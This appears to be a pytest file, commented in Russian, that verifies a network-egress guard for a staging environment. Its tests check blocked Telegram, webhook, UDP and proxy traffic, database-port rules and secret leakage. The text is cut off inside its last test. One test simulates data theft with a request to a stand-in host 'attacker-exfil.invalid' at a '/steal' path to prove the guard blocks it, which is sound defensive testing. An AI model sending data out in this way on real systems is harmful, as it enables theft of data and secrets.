"""Доказательство «тишины» стенда (stand_egress.py).

Каждый сценарий — отдельный субпроцесс с чистого листа: conftest.py всего
репозитория глушит сеть и подменяет get_gsheet_client для ВСЕХ тестов сразу,
и внутри обычного pytest-процесса эти подмены дали бы ложный зелёный —
guard посчитали бы работающим, даже если он не установлен вовсе. Поэтому
здесь — sys.executable -c "<script>" с боеподобными env и чтением JSON
из последней строки stdout.
"""
import json
import os
import subprocess
import sys
import textwrap
from contextlib import contextmanager
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]

BASE_ENV = {
    'SECRET_KEY': 'test-secret-only',
    'STAND_PASSWORD': 'test-secret-only',
    'PYTHON_DOTENV_DISABLED': '1',
    'LOCAL_NO_AUTH': '0',
    'BITRIX_WEBHOOK': 'https://bitrix.invalid/rest/fake/',
    'TELEGRAM_BOT_TOKEN': '111:fake-prod-token',
    'REF_LOGIN_BOT_TOKEN': '222:fake-ref-token',
    'GOOGLE_SA_JSON': '',
    'DOVERKA_API_KEY': 'fake-doverka-key',
    'CRM_WEBHOOK_URL': 'https://webhook.invalid/deal-completed',
    'WL_BOT_URL': 'https://wl-bot.invalid',
    'WL_BOT_API_KEY': 'fake-wl-key',
    'METRIKA_TOKEN': 'fake-metrika-token',
    'STAND_TG_CHAT': '-1009999999',
    'STAND_TG_TOKEN': '333:fake-stand-token',
    'STAND_DOCPARSE_KEY': 'fake-docparse-key',
    'STAND_PROD_RO_KEY': 'fake-prod-ro-key',
    'OPENROUTER_API_KEY': 'fake-openrouter-key',
    'HTTPS_PROXY': 'http://proxy.invalid:3128',
    'STAND_TRANSFER_POLL_ENABLED': '0',
    'REESTR_SYNC_ENABLED': '0',
    'PAYMENT_POLL_ENABLED': '0',
    'PAYIN_ADDR_BACKFILL': '0',
    'TRONSCAN_WARM_ENABLED': '0',
    'KYC_RETENTION_ENABLED': '0',
}


def run_script(body, stand_mode='1', extra_env=None, timeout=30):
    """Запускает `body` (питон-код) в свежем subprocess с боеподобным env.

    `body` должен напечатать ровно один JSON-объект последней строкой stdout —
    это и есть результат сценария (см. helper OUT() внутри шаблона).
    """
    env = dict(BASE_ENV)
    if stand_mode is not None:
        env['STAND_MODE'] = stand_mode
    if extra_env:
        for key, value in extra_env.items():
            if value is None:
                env.pop(key, None)
            else:
                env[key] = value
    # cwd субпроцесса — ROOT (ниже), а не временная папка: get_gsheet_client
    # ищет фолбэк-файл через os.path.dirname(__file__) app.py, то есть рядом
    # с самим app.py, а не в текущей директории процесса. DATABASE_URL —
    # абсолютный путь во /tmp, chdir для этого не нужен.
    preamble = textwrap.dedent(f'''
        import sys, os, json, tempfile
        sys.path.insert(0, {str(ROOT)!r})
        _workdir = tempfile.mkdtemp(prefix='stand-egress-test-')
        os.environ.setdefault('DATABASE_URL', 'sqlite:///' + _workdir + '/test.db')
        def OUT(d):
            print(json.dumps(d, default=str))
    ''')
    script = preamble + '\n' + textwrap.dedent(body)
    proc = subprocess.run([sys.executable, '-c', script], env=env,
                          capture_output=True, text=True, timeout=timeout, cwd=str(ROOT))
    last_line = ''
    for line in proc.stdout.splitlines():
        line = line.strip()
        if line:
            last_line = line
    assert last_line, (
        f'subprocess не напечатал результат.\\nSTDOUT:\\n{proc.stdout}\\nSTDERR:\\n{proc.stderr}')
    try:
        return json.loads(last_line), proc
    except json.JSONDecodeError:
        raise AssertionError(f'последняя строка stdout не JSON: {last_line!r}\\nSTDERR:\\n{proc.stderr}')


@contextmanager
def google_sa_file_at_root():
    """Кладёт google_sa.json туда, где его реально ищет get_gsheet_client
    (рядом с app.py), и гарантированно убирает файл после теста — даже если
    subprocess упал."""
    path = ROOT / 'google_sa.json'
    assert not path.exists(), 'google_sa.json уже существует в репозитории — не трогаю чужой файл'
    path.write_text(json.dumps({
        'type': 'service_account', 'client_email': 'x@x.iam.gserviceaccount.com',
        'private_key': '-----BEGIN PRIVATE KEY-----\nfake\n-----END PRIVATE KEY-----\n',
        'token_uri': 'https://oauth2.googleapis.com/token',
    }))
    try:
        yield path
    finally:
        path.unlink(missing_ok=True)


# ─────────────────────────── негативный контроль ───────────────────────────

def test_stand_mode_off_guard_not_installed():
    result, proc = run_script('''
        import stand_egress
        installed = stand_egress.install()
        import app  # noqa: F401 — прод-путь не должен падать без guard'а
        OUT({'installed': installed, 'active': stand_egress.status()['active']})
    ''', stand_mode='0')
    assert proc.returncode == 0, proc.stderr
    assert result == {'installed': False, 'active': False}


# ────────────────────────── сеть: хост важнее loopback ─────────────────────

def test_external_hostname_blocked_before_dns_redirect_to_loopback():
    """Ключевая проверка (уточнение соведущего): если внешний хост резолвится
    в локальный фейковый сервер, guard обязан отказать ДО этого резолва — по
    имени хоста, а не пропустить его как «loopback». Фейковый сервер не должен
    получить ни одного соединения, а запись блокировки — называть исходный хост."""
    result, proc = run_script('''
        import socket, threading, http.server, requests

        _real_getaddrinfo = socket.getaddrinfo
        hits = {'n': 0}

        class FakeH(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                hits['n'] += 1
                self.send_response(200); self.end_headers(); self.wfile.write(b'{}')
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), FakeH)
        fake_port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        EVIL_HOST = 'attacker-exfil.invalid'

        def fake_dns(host, port, *a, **kw):
            if host == EVIL_HOST:
                return _real_getaddrinfo('127.0.0.1', fake_port, *a, **kw)
            return _real_getaddrinfo(host, port, *a, **kw)
        socket.getaddrinfo = fake_dns  # подложили ДО install() — как это сделал бы conftest

        import stand_egress
        stand_egress.install()

        blocked = False
        try:
            requests.get(f'http://{EVIL_HOST}:80/steal', timeout=2)
        except requests.exceptions.ConnectionError:
            blocked = True

        st = stand_egress.status()
        recent_hosts = [r['where'] for r in st['recent']]
        OUT({
            'blocked': blocked,
            'fake_server_hits': hits['n'],
            'blocked_count': st['blocked_count'],
            'mentions_evil_host': any(EVIL_HOST in w for w in recent_hosts),
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['blocked'] is True
    assert result['fake_server_hits'] == 0, 'фейковый сервер не должен получить соединений'
    assert result['blocked_count'] >= 1
    assert result['mentions_evil_host'] is True, 'блокировка должна называть исходное имя хоста'


def test_loopback_direct_connection_allowed():
    result, proc = run_script('''
        import socket, threading, http.server, requests
        class FakeH(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
            def log_message(self, *a): pass
        srv = http.server.HTTPServer(('127.0.0.1', 0), FakeH)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()
        r = requests.get(f'http://127.0.0.1:{port}/', timeout=2)
        OUT({'status': r.status_code})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200


def test_ip_literal_and_ipv6_blocked():
    result, proc = run_script('''
        import socket
        import stand_egress
        stand_egress.install()

        blocked_ipv4 = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('203.0.113.5', 80))  # TEST-NET-3, гарантированно не наш
        except Exception:
            blocked_ipv4 = True

        blocked_ipv6 = False
        try:
            s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s6.settimeout(1)
            s6.connect(('2001:db8::1', 80))  # документационный IPv6-диапазон
        except Exception:
            blocked_ipv6 = True

        OUT({'blocked_ipv4': blocked_ipv4, 'blocked_ipv6': blocked_ipv6})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'blocked_ipv4': True, 'blocked_ipv6': True}


def test_redirect_not_followed_and_other_libs_blocked_to_telegram():
    """httpx/urllib/aiohttp к api.telegram.org — тоже отказ на сокете, не только requests."""
    result, proc = run_script('''
        import socket
        import stand_egress
        stand_egress.install()

        def blocked_with(fn):
            try:
                fn()
                return False
            except Exception:
                return True

        import requests
        r_blocked = blocked_with(lambda: requests.post(
            'https://api.telegram.org/botFAKE:TOKEN/sendMessage', json={'x': 1}, timeout=2))

        import urllib.request
        u_blocked = blocked_with(lambda: urllib.request.urlopen(
            'https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2))

        import httpx
        h_blocked = blocked_with(lambda: httpx.get(
            'https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2))

        import asyncio, aiohttp
        async def _try_aiohttp():
            async with aiohttp.ClientSession() as s:
                async with s.get('https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2) as resp:
                    await resp.read()
        a_blocked = blocked_with(lambda: asyncio.run(_try_aiohttp()))

        OUT({'requests': r_blocked, 'urllib': u_blocked, 'httpx': h_blocked, 'aiohttp': a_blocked})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'requests': True, 'urllib': True, 'httpx': True, 'aiohttp': True}


# ───────────────────────────── tg_call / can_send ──────────────────────────

def _fake_telegram_server_script():
    return '''
        import threading, http.server, json as _json

        class FakeTG(http.server.BaseHTTPRequestHandler):
            requests = []
            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length)
                FakeTG.requests.append({'path': self.path, 'body': _json.loads(body or b'{}')})
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(_json.dumps({'ok': True, 'result': {'id': 1}}).encode())
            def log_message(self, *a): pass

        _srv = http.server.HTTPServer(('127.0.0.1', 0), FakeTG)
        _tg_port = _srv.server_port
        threading.Thread(target=_srv.serve_forever, daemon=True).start()
    '''


def test_tg_call_send_message_to_allowed_chat_reaches_fake_telegram():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda channel, recipient, operation:
            operation == 'sendMessage' and recipient == 555)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'hi'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'hits': len(FakeTG.requests),
             'path': FakeTG.requests[0]['path'] if FakeTG.requests else None})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is True
    assert result['hits'] == 1
    assert result['path'].endswith('/sendMessage')


def test_tg_call_denies_wrong_chat_id_without_network():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda channel, recipient, operation:
            operation == 'sendMessage' and recipient == 555)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 999, 'text': 'nope'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['error'] == 'denied' and result['hits'] == 0


def test_tg_call_denies_group_chat_id():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)  # даже разрешающая политика не спасает группу

        res = stand_egress.tg_call('sendMessage', {'chat_id': -1001234567890, 'text': 'group'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['hits'] == 0


def test_tg_call_denies_send_document_method():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)

        res = stand_egress.tg_call('sendDocument', {'chat_id': 555}, _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['error'] == 'method_not_allowed' and result['hits'] == 0


def test_tg_call_default_policy_allows_read_only_methods():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()  # политика не регистрируется — дефолт

        res = stand_egress.tg_call('getMe', {}, _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is True and result['hits'] == 1


# ───────────────────────────── прикладные точки выхода ─────────────────────

def test_app_scenarios_no_egress_and_correct_status_codes():
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app

        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()

        out = {}

        # bitrix_deals._post блокируется до HTTP, даже с валидным BITRIX_WEBHOOK.
        import bitrix_deals
        try:
            bitrix_deals._post('crm.deal.list', {})
            out['bitrix_blocked'] = False
        except bitrix_deals.BitrixError as e:
            out['bitrix_blocked'] = str(e) == 'stand_blocked'

        # /api/stand/egress-status: без сессии — 401
        r = client.get('/api/stand/egress-status')
        out['egress_status_anon'] = r.status_code

        db = app.get_session()
        try:
            manager = app.AdminUser(username='mgr-test', role='manager', password_hash=b'x')
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            db.add_all([manager, admin]); db.commit()
            mgr_id, admin_id = manager.id, admin.id
        finally:
            db.close()

        # не-admin — 403 на egress-status
        with client.session_transaction() as sess:
            sess['user_id'] = mgr_id
        out['egress_status_manager'] = client.get('/api/stand/egress-status').status_code

        # Дальше — залогинены админом: точки выхода блокируются в STAND_MODE
        # независимо от роли, авторизация тут не при чём.
        with client.session_transaction() as sess:
            sess['user_id'] = admin_id

        r = client.get('/api/stand/egress-status')
        out['egress_status_admin'] = (r.status_code, r.get_json().get('success'))

        r = client.post('/api/proxy/create-payment', json={'amount': 100, 'order_id': 'X'})
        out['create_payment'] = (r.status_code, r.get_json().get('error'))

        r = client.post('/api/docs/parse', data={'deal_type': 'rental'},
                        content_type='multipart/form-data')
        out['docs_parse'] = (r.status_code, r.get_json().get('error'))

        # /api/rates теперь ходит через read_get (T9) — подменяем его здесь на
        # детерминированный отказ, чтобы тест не зависел от реальной сети.
        import stand_egress as _se
        _se.read_get = lambda op, params=None, _base_url=None: (None, None, 'network_error')
        r = client.get('/api/rates')
        out['rates'] = (r.status_code, r.get_json().get('stand_blocked'), r.get_json().get('success'))

        r = client.post('/api/reestr/sync')
        out['reestr_sync'] = (r.status_code, r.get_json().get('error'))

        r = client.post('/api/stand/prod-agents')
        out['prod_agents'] = (r.status_code, r.get_json().get('error'))

        r = client.get('/api/doverka/payments')
        out['doverka_payments'] = (r.status_code, r.get_json().get('error'))

        r = client.get('/api/doverka/currencies')
        out['doverka_currencies'] = (r.status_code, r.get_json().get('error'))

        OUT(out)
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['bitrix_blocked'] is True
    assert result['create_payment'] == [403, 'stand_blocked']
    assert result['docs_parse'] == [403, 'stand_blocked']
    assert result['rates'] == [200, False, False]
    assert result['reestr_sync'] == [403, 'stand_blocked']
    assert result['prod_agents'] == [403, 'stand_blocked']
    assert result['egress_status_anon'] == 401
    assert result['egress_status_manager'] == 403
    assert result['egress_status_admin'] == [200, True]
    assert result['doverka_payments'] == [403, 'stand_blocked']
    assert result['doverka_currencies'] == [403, 'stand_blocked']


def test_get_gsheet_client_ignores_local_service_account_file():
    """STAND_MODE гасит GOOGLE_SA_JSON/OAuth env, но локальный google_sa.json
    рядом с app.py — их обходит (P0 из независимого аудита 28.09). Кладём файл
    туда, где его реально ищет os.path.dirname(__file__), и убираем после теста."""
    with google_sa_file_at_root():
        result, proc = run_script('''
            import stand_egress
            stand_egress.install()
            import app
            OUT({'gsheet_client_none': app.get_gsheet_client() is None})
        ''')
    assert proc.returncode == 0, proc.stderr
    assert result['gsheet_client_none'] is True


def test_gsheet_client_uses_local_file_outside_stand_mode():
    """Негативный контроль: вне STAND_MODE тот же файл реально читается и
    доходит до разбора ключа (падает на невалидном fake PEM) — доказывает,
    что предыдущий тест проверяет настоящий фолбэк, а не «файла и так никто
    не находит»."""
    with google_sa_file_at_root():
        result, proc = run_script('''
            import app
            try:
                app.get_gsheet_client()
                OUT({'raised': False, 'detail': None})
            except Exception as e:
                OUT({'raised': True, 'detail': str(e)[:200]})
        ''', stand_mode='0')
    assert proc.returncode == 0, proc.stderr
    # Ключ фиктивный и не распарсится — важно, что до разбора вообще дошло
    # (значит, файл был прочитан), а не что итог — рабочий клиент.
    assert result['raised'] is True


# ───────────────── фиксы по независимому аудиту 28.09 (P1×2 + 2) ───────────

def test_db_host_exact_port_enforced_not_just_ip():
    """P1: раньше проверялся только IP базы, порт игнорировался — соединение
    на IP базы:443 или на её же хосте:443 проходило при DSN на 5432. Порт по
    умолчанию (нет в DSN) — 5432. Повторяет сценарий T1-probes.py."""
    result, proc = run_script('''
        import socket
        _real_getaddrinfo = socket.getaddrinfo
        # Как в T1-probes.py: подменяем резолвер ДО install(), чтобы любой хост
        # резолвился в один и тот же «адрес базы».
        socket.getaddrinfo = lambda host, port, *a, **k: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('192.0.2.10', port))]

        import stand_egress
        stand_egress.install()

        def probe(addr):
            try:
                with socket.socket() as s:
                    s.settimeout(1)
                    s.connect(addr)
                return True
            except Exception:
                return False

        OUT({
            'db_right_port': probe(('192.0.2.10', 5432)),
            'db_wrong_port': probe(('192.0.2.10', 443)),
            'db_host_wrong_port': probe(('stand-db.railway.internal', 443)),
            'foreign_ip': probe(('198.51.100.20', 443)),
        })
    ''', extra_env={'DATABASE_URL': 'postgresql://fake:fake@stand-db.railway.internal:5432/candidate'})
    assert proc.returncode == 0, proc.stderr
    assert result['db_right_port'] is True, 'точный host:port базы обязан проходить'
    assert result['db_wrong_port'] is False, 'тот же IP на чужом порту — блок'
    assert result['db_host_wrong_port'] is False, 'тот же хост на чужом порту — блок'
    assert result['foreign_ip'] is False


def test_db_port_defaults_to_5432_when_dsn_omits_it():
    result, proc = run_script('''
        import socket
        socket.getaddrinfo = lambda host, port, *a, **k: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('192.0.2.10', port))]
        import stand_egress
        stand_egress.install()
        def probe(addr):
            try:
                with socket.socket() as s:
                    s.settimeout(1); s.connect(addr)
                return True
            except Exception:
                return False
        OUT({
            'default_port_allowed': probe(('192.0.2.10', 5432)),
            'other_port_blocked': probe(('192.0.2.10', 5433)),
        })
    ''', extra_env={'DATABASE_URL': 'postgresql://fake:fake@stand-db.railway.internal/candidate'})
    assert proc.returncode == 0, proc.stderr
    assert result['default_port_allowed'] is True
    assert result['other_port_blocked'] is False


def test_udp_sendto_and_sendmsg_blocked_to_external_address():
    """sendto/sendmsg — тихий отказ (UDP fire-and-forget, вызывающий код обычно
    не оборачивает их в try/except), но реальный транспорт не вызывается —
    считаем по счётчику блокировок и по неизменной длине трекера снаружи."""
    result, proc = run_script('''
        import socket
        _orig_sendto = socket.socket.sendto
        calls = []
        def _tracking_sendto(self, *args):
            calls.append(args[-1])
            return _orig_sendto(self, *args)
        socket.socket.sendto = _tracking_sendto

        import stand_egress
        stand_egress.install()

        before = stand_egress.status()['blocked_count']
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            n = s.sendto(b'FAKE', ('198.51.100.20', 9999))
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            m = s.sendmsg([b'FAKE'], [], 0, ('198.51.100.20', 9999))
        after = stand_egress.status()['blocked_count']
        calls_for_external = len(calls)

        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            loop_n = s.sendto(b'ok', ('127.0.0.1', 9999))

        OUT({'sendto_return': n, 'sendmsg_return': m,
             'lower_transport_calls': calls_for_external,
             'blocked_count_grew_by_2': after - before == 2,
             'loopback_sendto_ok': loop_n == 2})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['lower_transport_calls'] == 0, 'внешний UDP не должен доходить до транспорта'
    assert result['sendto_return'] == 4  # len(b'FAKE') — тихий "успех", данные никуда не ушли
    assert result['sendmsg_return'] == 4
    assert result['blocked_count_grew_by_2'] is True
    assert result['loopback_sendto_ok'] is True


def test_tg_call_network_error_does_not_leak_token():
    """P1: requests оборачивает URL (…/bot<TOKEN>/method) прямо в текст
    исключения — прежний код отдавал str(e) наружу. Теперь — стабильный код
    ошибки, ни исключение, ни URL никуда не уходят и не логируются."""
    result, proc = run_script('''
        import io, contextlib
        from unittest.mock import patch
        import requests
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)

        class FakeSession:
            trust_env = True
            def post(self, url, **kwargs):
                raise requests.exceptions.ConnectionError(
                    'HTTPSConnectionPool: Max retries exceeded with url: ' + url)
            def close(self):
                pass

        captured = io.StringIO()
        with patch('requests.Session', return_value=FakeSession()):
            with contextlib.redirect_stdout(captured):
                res = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})

        token = os.environ['STAND_TG_TOKEN']
        OUT({
            'error': res.get('error'),
            'token_in_error': token in (res.get('error') or ''),
            'token_in_stdout': token in captured.getvalue(),
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['error'] == 'tg_network_error'
    assert result['token_in_error'] is False
    assert result['token_in_stdout'] is False


# ───────────────── ранее отмеченные непокрытыми точки выхода ───────────────

def test_stand_tg_send_group_disabled_no_network():
    """_stand_tg_send (группа STAND_TG_CHAT) выключена насовсем — план п.1.2:
    T5 заменит на личку через tg_call. Токен и chat_id в env валидны, но
    функция не должна даже пытаться открыть соединение."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app
        before = stand_egress.status()['blocked_count']
        sent = app._stand_tg_send('SYNTHETIC AUDIT MESSAGE')
        after = stand_egress.status()['blocked_count']
        OUT({'sent': sent, 'blocked_count_unchanged': after == before})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['sent'] is False
    assert result['blocked_count_unchanged'] is True


def test_verify_transfer_ignores_direct_get_and_prod_key_in_stand_mode():
    """На стенде verify_transfer не должен вызывать ни переданный вызывающим
    `get`, ни прод-ключ Etherscan — только read_get(T9) и STAND_ETHERSCAN_API_KEY."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import stand_transfers as st

        def boom(*a, **kw):
            raise AssertionError('прямой get() не должен вызываться на стенде')

        calls = []
        def fake_read_get(op, params=None, _base_url=None):
            calls.append(op)
            if op == 'tron_tx_info':
                return 200, {}, None  # ещё не появилась в TronScan
            raise AssertionError(f'неожиданный op={op}')
        stand_egress.read_get = fake_read_get

        r_trc20 = st.verify_transfer('a' * 64, 'trc20',
                                     'TWBgeUo74DehAPgw5cKTdYUTXtJELqwwqn',
                                     'TWBgeUo74DehAPgw5cKTdYUTXtJELqwwqn',
                                     100, get=boom)
        # erc20 без STAND_ETHERSCAN_API_KEY (только прод-ключ передан вызывающим) —
        # честный отказ до сети, прод-ключ 'fake' не используется.
        r_erc20 = st.verify_transfer('0x' + 'a' * 64, 'erc20',
                                     '0x' + 'c' * 40, '0x' + 'b' * 40, 100,
                                     get=boom, etherscan_key='fake')
        OUT({'trc20_status': r_trc20['status'], 'erc20_status': r_erc20['status'],
             'erc20_error': r_erc20.get('checkError'), 'read_get_calls': calls})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['trc20_status'] == 'pending'
    assert result['erc20_status'] == 'error'
    assert 'настро' in (result['erc20_error'] or '')
    assert result['read_get_calls'] == ['tron_tx_info']


def test_verify_transfer_uses_stand_etherscan_key_via_read_get():
    """С заданным STAND_ETHERSCAN_API_KEY ERC-20 проверка идёт через read_get
    с валидными op/params, а не через прямой requests.get."""
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import stand_transfers as st

        seen = []
        def fake_read_get(op, params=None, _base_url=None):
            seen.append((op, params))
            if op == 'eth_tx_receipt':
                return 200, {'result': None}, None  # ещё нет receipt
            raise AssertionError(f'неожиданный op={op}')
        stand_egress.read_get = fake_read_get

        r = st.verify_transfer('0x' + 'a' * 64, 'erc20',
                               '0x' + 'c' * 40, '0x' + 'b' * 40, 100)
        OUT({'status': r['status'], 'seen': seen})
    ''', extra_env={'STAND_ETHERSCAN_API_KEY': 'stand-fake-key'})
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 'pending'
    op, params = result['seen'][0]
    assert op == 'eth_tx_receipt'
    assert set(params) == {'chainid', 'module', 'action', 'txhash'}
    assert 'apikey' not in params, 'ключ канал добавляет сам, а не вызывающий код'


def test_referral_links_empty_bot_and_wa_links_in_stand_mode():
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app
        links = app.referral_links('GR-TEST', 'ru')
        OUT(links)
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['bot_link'] == ''
    assert result['wa_link'] == ''
    assert result['referral_link']  # сама ссылка на калькулятор остаётся


def test_transfer_poll_thread_started_by_default():
    """T9: дефолт вернули на '1' — поллер ходит только через read_get (канал T9),
    поэтому с заливкой прод-данных и включённым каналом он снова нужен по умолчанию."""
    result, proc = run_script('''
        import threading
        import stand_egress
        stand_egress.install()
        import app
        import time
        time.sleep(0.2)
        names = [t.name for t in threading.enumerate()]
        OUT({'poll_thread_running': 'stand-transfer-poll' in names})
    ''', extra_env={'STAND_TRANSFER_POLL_ENABLED': None})  # снимаем ключ — проверяем дефолт
    assert proc.returncode == 0, proc.stderr
    assert result['poll_thread_running'] is True


def test_transfer_poll_thread_can_still_be_disabled():
    result, proc = run_script('''
        import threading
        import stand_egress
        stand_egress.install()
        import app
        import time
        time.sleep(0.2)
        names = [t.name for t in threading.enumerate()]
        OUT({'poll_thread_running': 'stand-transfer-poll' in names})
    ''', extra_env={'STAND_TRANSFER_POLL_ENABLED': '0'})
    assert proc.returncode == 0, proc.stderr
    assert result['poll_thread_running'] is False


# ───────────── фиксы по QA-раунду 2 (proxy, chat_id, логи, деньги) ─────────

def test_env_proxy_stripped_and_ignored_even_for_direct_stand_egress_import():
    """QA E10/E11: с HTTPS_PROXY/ALL_PROXY в env запрос к api.telegram.org уходил
    в CONNECT-туннель прокси (адрес прокси — loopback, он разрешён), а реальная
    цель на сокетном уровне не видна вообще. install() обязан стереть env-прокси
    сам — тест импортирует только stand_egress, без app.py."""
    result, proc = run_script('''
        import http.server, threading, os, requests

        class Proxy(http.server.BaseHTTPRequestHandler):
            hits = []
            def do_CONNECT(self):
                Proxy.hits.append(self.path)
                self.send_error(403)
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), Proxy)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        os.environ['HTTPS_PROXY'] = f'http://127.0.0.1:{srv.server_port}'
        os.environ['ALL_PROXY'] = f'http://127.0.0.1:{srv.server_port}'

        import stand_egress
        stand_egress.install()

        try:
            requests.get('https://api.telegram.org/botWRONG:TOKEN/getMe', timeout=2)
        except Exception:
            pass

        OUT({
            'proxy_env_left': {k: os.environ.get(k) for k in
                               ('HTTPS_PROXY', 'ALL_PROXY', 'HTTP_PROXY', 'NO_PROXY')},
            'proxy_connects': Proxy.hits,
            'guard_blocks': stand_egress.status()['blocked_count'],
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['proxy_env_left'] == {'HTTPS_PROXY': None, 'ALL_PROXY': None,
                                        'HTTP_PROXY': None, 'NO_PROXY': None}
    assert result['proxy_connects'] == [], 'запрос не должен был даже дойти до прокси'
    assert result['guard_blocks'] >= 1


def test_tg_call_rejects_non_int_and_bool_chat_id():
    """QA E08: int('555') тихо принимал строку — chat_id обязан быть настоящим
    int, не строкой и не bool (bool — подкласс int в Python)."""
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)  # разрешающая политика — не должна спасать плохой тип

        r_str = stand_egress.tg_call('sendMessage', {'chat_id': '555', 'text': 'x'},
                                     _base_url=f'http://127.0.0.1:{_tg_port}')
        r_bool = stand_egress.tg_call('sendMessage', {'chat_id': True, 'text': 'x'},
                                      _base_url=f'http://127.0.0.1:{_tg_port}')
        r_float = stand_egress.tg_call('sendMessage', {'chat_id': 555.0, 'text': 'x'},
                                       _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'str_error': r_str.get('error'), 'bool_error': r_bool.get('error'),
             'float_error': r_float.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['str_error'] == 'invalid_chat_id'
    assert result['bool_error'] == 'invalid_chat_id'
    assert result['float_error'] == 'invalid_chat_id'
    assert result['hits'] == 0


def test_no_secrets_leak_across_blocked_scenarios_stdout_stderr():
    """QA E16: requests вшивает полный URL (…/bot<TOKEN>/method, ?secret=...)
    в текст исключения — прогоняем все прямые Telegram/webhook-функции с
    фейковыми секретами и проверяем, что ни один секрет не просочился ни в
    stdout, ни в stderr subprocess."""
    result, proc = run_script('''
        import io, contextlib
        import stand_egress
        stand_egress.install()
        import app

        buf = io.StringIO()
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(buf):
            app.send_webhook_async('https://webhook.invalid/path?secret=WEBHOOK_SECRET_SENTINEL', {'x': 1})
            import time; time.sleep(0.2)
            app._tg_answer_callback('BOT_TOKEN_SENTINEL', 'q', 'x')
            app._tg_edit_message('BOT_TOKEN_SENTINEL', {'message': {'chat': {'id': 555}, 'message_id': 1}}, 'x')
            app._tg_send_document('BOT_TOKEN_SENTINEL', 555, b'X', 'test.pdf', 'x')
            app.send_telegram_notification('x')
            import os
            os.environ['REF_LOGIN_BOT_TOKEN'] = 'DM_TOKEN_SENTINEL'
            app._login_bot_username_cache = None
            class FakeRef:
                telegram_user_id = 555
            app.send_referrer_dm(FakeRef(), 'x')

        out = buf.getvalue()
        OUT({
            'webhook_secret': 'WEBHOOK_SECRET_SENTINEL' in out,
            'bot_token': 'BOT_TOKEN_SENTINEL' in out,
            'dm_token': 'DM_TOKEN_SENTINEL' in out,
        })
